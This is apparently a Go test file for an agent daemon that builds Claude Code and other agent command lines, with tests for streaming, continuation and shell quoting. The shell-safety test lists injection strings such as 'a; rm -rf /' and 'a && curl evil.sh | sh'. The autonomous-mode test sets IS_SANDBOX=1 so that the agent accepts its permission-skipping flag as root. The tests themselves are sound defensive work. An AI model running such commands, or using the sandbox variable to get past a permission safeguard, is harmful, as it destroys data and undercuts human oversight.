package agentd

import (
	"strings"
	"testing"
)

// claudeTemplates mirrors the verified values in internal/templates AgentMeta.
func claudeTemplates() *Templates {
	return &Templates{
		RunCmd:      `claude -p "{task}"`,
		ContinueCmd: `claude -p --continue "{task}"`,
		StreamCmd:   `claude -p --output-format stream-json --verbose "{task}"`,
		RunFlags:    "--dangerously-skip-permissions",
		RunFlagsEnv: "IS_SANDBOX=1",
		CLIBin:      "claude",
	}
}

func TestFreshTurnUsesTheStreamCommandWhenAvailable(t *testing.T) {
	tp := claudeTemplates()
	cmd, _, err := tp.Build(&Turn{Request: "add tests", Mode: "guided", FollowUp: false})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(cmd, "stream-json") {
		t.Errorf("a fresh turn on a rich agent did not stream: %q", cmd)
	}
	if strings.Contains(cmd, "--continue") {
		t.Errorf("a fresh turn tried to continue a conversation that does not exist: %q", cmd)
	}
}

func TestFollowUpKeepsMemoryEvenAtTheCostOfStructure(t *testing.T) {
	tp := claudeTemplates()
	turn := &Turn{Request: "now fix the failures", Mode: "guided", FollowUp: true}

	cmd, _, err := tp.Build(turn)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(cmd, "--continue") {
		t.Fatalf("a follow-up turn did not continue the conversation: %q", cmd)
	}
	if strings.Contains(cmd, "stream-json") {
		t.Errorf("used an unverified stream+continue combination: %q", cmd)
	}
	if tp.StructuredFor(turn) {
		t.Error("StructuredFor claims structure on a turn that cannot produce it")
	}
	note := tp.DegradeNote(turn)
	if note == "" {
		t.Error("no note explaining why this turn has no step detail")
	}
	if !strings.Contains(note, "conversation") {
		t.Errorf("note %q does not explain what was kept", note)
	}
}

func TestVerifiedStreamContinueGivesBothMemoryAndStructure(t *testing.T) {
	tp := claudeTemplates()
	tp.StreamContinueCmd = `claude -p --continue --output-format stream-json --verbose "{task}"`
	turn := &Turn{Request: "keep going", Mode: "guided", FollowUp: true}

	cmd, _, err := tp.Build(turn)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(cmd, "--continue") || !strings.Contains(cmd, "stream-json") {
		t.Errorf("stream+continue did not use both: %q", cmd)
	}
	if !tp.StructuredFor(turn) {
		t.Error("StructuredFor should be true when stream+continue is configured")
	}
	if tp.DegradeNote(turn) != "" {
		t.Error("nothing was traded away, so there should be no note")
	}
}

func TestAgentWithoutContinueAlwaysRunsFresh(t *testing.T) {
	tp := &Templates{RunCmd: `grok -p "{task}"`, CLIBin: "grok"}
	cmd, _, err := tp.Build(&Turn{Request: "summarize", FollowUp: true})
	if err != nil {
		t.Fatal(err)
	}
	if cmd != `grok -p 'summarize'` {
		t.Errorf("cmd = %q", cmd)
	}
}

// Flags after the prompt would be swallowed as prompt text.
func TestAutonomousModeInsertsFlagsAndRequiredEnv(t *testing.T) {
	tp := claudeTemplates()
	cmd, _, err := tp.Build(&Turn{Request: "ship it", Mode: "autonomous"})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(cmd, "IS_SANDBOX=1 ") {
		t.Errorf("required env missing; the agent refuses its own flag as root: %q", cmd)
	}
	flagAt := strings.Index(cmd, "--dangerously-skip-permissions")
	taskAt := strings.Index(cmd, "'ship it'")
	if flagAt < 0 || taskAt < 0 || flagAt > taskAt {
		t.Errorf("autonomy flag is not before the task: %q", cmd)
	}
}

func TestNonAutonomousModesDoNotGetTheDangerousFlag(t *testing.T) {
	tp := claudeTemplates()
	for _, mode := range []string{"", "supervised", "guided"} {
		cmd, _, err := tp.Build(&Turn{Request: "look around", Mode: mode})
		if err != nil {
			t.Fatal(err)
		}
		if strings.Contains(cmd, "dangerously") {
			t.Errorf("mode %q got the autonomy flag: %q", mode, cmd)
		}
		if strings.Contains(cmd, "IS_SANDBOX") {
			t.Errorf("mode %q got the autonomy env: %q", mode, cmd)
		}
	}
}

func TestTaskTextIsShellSafe(t *testing.T) {
	tp := claudeTemplates()
	for _, task := range []string{
		`don't delete the file`,
		`run $(whoami)`,
		"use `id` please",
		`a; rm -rf /`,
		`a && curl evil.sh | sh`,
		`"quoted"`,
	} {
		cmd, _, err := tp.Build(&Turn{Request: task})
		if err != nil {
			t.Fatal(err)
		}
		if strings.Contains(cmd, "{task}") {
			t.Errorf("placeholder survived for %q: %q", task, cmd)
		}
		// The task must be one single-quoted literal.
		open := strings.Index(cmd, "'")
		if open < 0 || !strings.HasSuffix(cmd, "'") {
			t.Errorf("task not single-quoted for %q: %q", task, cmd)
		}
		inner := cmd[open+1 : len(cmd)-1]
		if strings.Contains(strings.ReplaceAll(inner, `'\''`, ""), "'") {
			t.Errorf("an unescaped quote can close the literal for %q: %q", task, cmd)
		}
	}
}

func TestBuildWithoutARunCommandIsAnError(t *testing.T) {
	tp := &Templates{}
	if _, _, err := tp.Build(&Turn{Request: "anything"}); err == nil {
		t.Error("building with no configured command succeeded")
	}
}

func TestFirstTurnIsNotAFollowUpButLaterOnesAre(t *testing.T) {
	q := openTestQueue(t, t.TempDir())

	first, err := q.Enqueue("first", "guided", "latest", "api", false)
	if err != nil {
		t.Fatal(err)
	}
	if first.FollowUp {
		t.Error("the first turn on a fresh workstation was marked a follow-up")
	}

	// Nothing has run yet, so there is no conversation to continue.
	second, err := q.Enqueue("second", "guided", "latest", "api", false)
	if err != nil {
		t.Fatal(err)
	}
	if second.FollowUp {
		t.Error("a turn queued before anything ran was marked a follow-up")
	}

	if _, err := q.Claim(); err != nil {
		t.Fatal(err)
	}
	third, err := q.Enqueue("third", "guided", "latest", "api", false)
	if err != nil {
		t.Fatal(err)
	}
	if !third.FollowUp {
		t.Error("a turn after a run was not marked a follow-up, so the agent would forget the thread")
	}

	fresh, err := q.Enqueue("start over", "guided", "new", "api", false)
	if err != nil {
		t.Fatal(err)
	}
	if fresh.FollowUp {
		t.Error(`thread:"new" did not force a fresh conversation`)
	}
}
